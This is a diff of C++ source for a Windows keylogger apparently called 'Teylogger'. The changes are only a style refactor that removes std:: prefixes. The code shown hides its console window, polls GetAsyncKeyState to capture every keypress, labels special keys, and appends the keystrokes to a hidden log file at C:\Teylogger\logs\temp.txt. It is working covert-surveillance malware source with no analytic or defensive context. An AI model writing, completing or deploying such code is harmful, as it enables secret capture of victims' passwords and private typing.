@@ -4,14 +4,15 @@
 #include <fstream>
 #include <windows.h>
 #include <bits/stdc++.h>
-void save(std::string data) {
-    std::fstream file;
-    file.open("C:\\Teylogger\\logs\\temp.txt", std::ios::app);
+using namespace std;
+void save(string data) {
+    fstream file;
+    file.open("C:\\Teylogger\\logs\\temp.txt", ios::app);
     file << data;
     file.close();
 };
-std::string special(int key) {
-    std::string result;
+string special(int key) {
+    string result;
     switch(key) {
         case VK_F1:
             result = "[F1]";
@@ -253,7 +254,7 @@ std::string special(int key) {
 };
 int main() {
     int specials[] = { VK_F1, VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12, VK_F13, VK_F14, VK_F15, VK_F16, VK_F17, VK_F18, VK_F19, VK_F20, VK_F21, VK_F22, VK_F23, VK_F24, VK_PAUSE, VK_SCROLL, VK_SNAPSHOT, VK_LWIN, VK_RWIN, VK_RETURN, VK_BACK, VK_CAPITAL, VK_NUMLOCK, VK_HOME, VK_INSERT, VK_END, VK_PRIOR, VK_NEXT, VK_LSHIFT, VK_RSHIFT, VK_TAB, VK_LCONTROL, VK_RCONTROL, VK_LMENU, VK_RMENU, VK_ESCAPE, VK_DELETE, VK_UP, VK_DOWN, VK_LEFT, VK_RIGHT, VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9, VK_OEM_COMMA, VK_ADD, VK_OEM_PLUS, VK_SUBTRACT, VK_OEM_MINUS, VK_DIVIDE, VK_MULTIPLY, VK_DECIMAL, VK_OEM_PERIOD, VK_OEM_1, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7, VK_OEM_102 };
-    std::string specials_;
+    string specials_;
     bool is;
     HWND window = GetConsoleWindow();
     ShowWindow(window, SW_HIDE);
@@ -261,12 +262,12 @@ int main() {
         Sleep(10);
         for(int key = 8; key <= 190; key ++) {
             if(GetAsyncKeyState(key) == -32767) {
-                is = std::find(std::begin(specials), std::end(specials), key) == std::end(specials);
+                is = find(begin(specials), end(specials), key) == end(specials);
                 if(is) {
                     if(GetKeyState(VK_CAPITAL)) {
-                        save(std::string(1, (char)key));
+                        save(string(1, (char)key));
                     } else {
-                        save(std::string(1, (char)std::tolower(key)));
+                        save(string(1, (char)tolower(key)));
                     };
                 } else {
                     specials_ = special(key);
